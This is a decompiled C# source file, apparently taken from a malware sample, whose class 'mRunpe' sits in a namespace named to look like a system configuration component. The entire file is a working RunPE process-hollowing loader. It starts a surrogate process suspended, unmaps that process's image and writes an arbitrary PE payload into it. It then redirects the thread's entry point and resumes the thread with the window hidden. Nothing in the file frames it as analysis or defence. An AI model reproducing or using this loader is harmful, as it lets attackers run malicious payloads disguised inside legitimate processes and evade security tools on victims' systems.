using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;

namespace System_Configuration
{
	// Token: 0x02000018 RID: 24
	public class mRunpe
	{
		// Token: 0x06000095 RID: 149
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, [In] ref mRunpe.STARTUPINFO lpStartupInfo, IntPtr[] pInfo);

		// Token: 0x06000096 RID: 150
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);

		// Token: 0x06000097 RID: 151
		[DllImport("ntdll")]
		private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		// Token: 0x06000098 RID: 152
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);

		// Token: 0x06000099 RID: 153
		[DllImport("kernel32.dll")]
		private static extern uint ResumeThread(IntPtr hThread);

		// Token: 0x0600009A RID: 154
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);

		// Token: 0x0600009B RID: 155
		[DllImport("kernel32")]
		private static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr sizel, int allocType, int prot);

		// Token: 0x0600009C RID: 156
		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);

		// Token: 0x0600009D RID: 157
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, int lpNumberOfBytesWritten);

		// Token: 0x0600009E RID: 158 RVA: 0x000097EC File Offset: 0x000079EC
		public static bool InjectPE(byte[] bytes, string surrogateProcess, string optionalArguments = "")
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				mRunpe.STARTUPINFO startupinfo = default(mRunpe.STARTUPINFO);
				int num = BitConverter.ToInt32(bytes, 60);
				int num2 = (int)BitConverter.ToInt16(bytes, num + 6);
				IntPtr value = new IntPtr(BitConverter.ToInt32(bytes, num + 84));
				startupinfo.cb = Strings.Len(startupinfo);
				startupinfo.wShowWindow = 0;
				startupinfo.dwFlags = 257;
				Process process = new Process();
				process.StartInfo.CreateNoWindow = false;
				if (!string.IsNullOrEmpty(optionalArguments))
				{
					surrogateProcess = surrogateProcess + " " + optionalArguments;
				}
				if (!mRunpe.CreateProcess(null, new StringBuilder(surrogateProcess), zero, zero, false, 4, zero, null, ref startupinfo, array))
				{
					return false;
				}
				uint[] array2 = new uint[179];
				array2[0] = 65538u;
				if (mRunpe.GetThreadContext(array[1], array2))
				{
					IntPtr baseAddr = new IntPtr((long)((ulong)array2[41] + 8UL));
					IntPtr zero2 = IntPtr.Zero;
					IntPtr value2 = new IntPtr(4);
					IntPtr zero3 = IntPtr.Zero;
					if (mRunpe.ReadProcessMemory(array[0], baseAddr, ref zero2, (int)value2, ref zero3) && (ulong)mRunpe.NtUnmapViewOfSection(array[0], zero2) == 0UL)
					{
						IntPtr intPtr = new IntPtr(BitConverter.ToInt32(bytes, num + 52));
						IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(bytes, num + 80));
						IntPtr lpBaseAddress = mRunpe.VirtualAllocEx(array[0], intPtr, intPtr2, 12288, 64);
						int lpNumberOfBytesWritten;
						mRunpe.WriteProcessMemory(array[0], lpBaseAddress, bytes, (uint)((int)value), lpNumberOfBytesWritten);
						int num3 = num2 - 1;
						int num4 = 0;
						int num5 = num3;
						for (int i = num4; i <= num5; i++)
						{
							int[] array3 = new int[10];
							Buffer.BlockCopy(bytes, num + 248 + i * 40, array3, 0, 40);
							byte[] array4 = new byte[array3[4] - 1 + 1];
							Buffer.BlockCopy(bytes, array3[5], array4, 0, array4.Length);
							intPtr2 = new IntPtr(lpBaseAddress.ToInt32() + array3[3]);
							intPtr = new IntPtr(array4.Length);
							mRunpe.WriteProcessMemory(array[0], intPtr2, array4, (uint)((int)intPtr), lpNumberOfBytesWritten);
						}
						intPtr2 = new IntPtr((long)((ulong)array2[41] + 8UL));
						intPtr = new IntPtr(4);
						mRunpe.WriteProcessMemory(array[0], intPtr2, BitConverter.GetBytes(lpBaseAddress.ToInt32()), (uint)((int)intPtr), lpNumberOfBytesWritten);
						array2[44] = (uint)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num + 40));
						mRunpe.SetThreadContext(array[1], array2);
					}
				}
				Thread.Sleep(1000);
				mRunpe.ResumeThread(array[1]);
			}
			catch (Exception ex)
			{
				return false;
			}
			return true;
		}

		// Token: 0x04000079 RID: 121
		private const long STARTF_USESHOWWINDOW = 1L;

		// Token: 0x0400007A RID: 122
		private const long STARTF_USESTDHANDLES = 256L;

		// Token: 0x0400007B RID: 123
		private const int SW_HIDE = 0;

		// Token: 0x02000057 RID: 87
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			// Token: 0x04000185 RID: 389
			public int cb;

			// Token: 0x04000186 RID: 390
			public string lpReserved;

			// Token: 0x04000187 RID: 391
			public string lpDesktop;

			// Token: 0x04000188 RID: 392
			public string lpTitle;

			// Token: 0x04000189 RID: 393
			public int dwX;

			// Token: 0x0400018A RID: 394
			public int dwY;

			// Token: 0x0400018B RID: 395
			public int dwXSize;

			// Token: 0x0400018C RID: 396
			public int dwYSize;

			// Token: 0x0400018D RID: 397
			public int dwXCountChars;

			// Token: 0x0400018E RID: 398
			public int dwYCountChars;

			// Token: 0x0400018F RID: 399
			public int dwFillAttribute;

			// Token: 0x04000190 RID: 400
			public int dwFlags;

			// Token: 0x04000191 RID: 401
			public short wShowWindow;

			// Token: 0x04000192 RID: 402
			public short cbReserved2;

			// Token: 0x04000193 RID: 403
			public int lpReserved2;

			// Token: 0x04000194 RID: 404
			public int hStdInput;

			// Token: 0x04000195 RID: 405
			public int hStdOutput;

			// Token: 0x04000196 RID: 406
			public int hStdError;
		}
	}
}
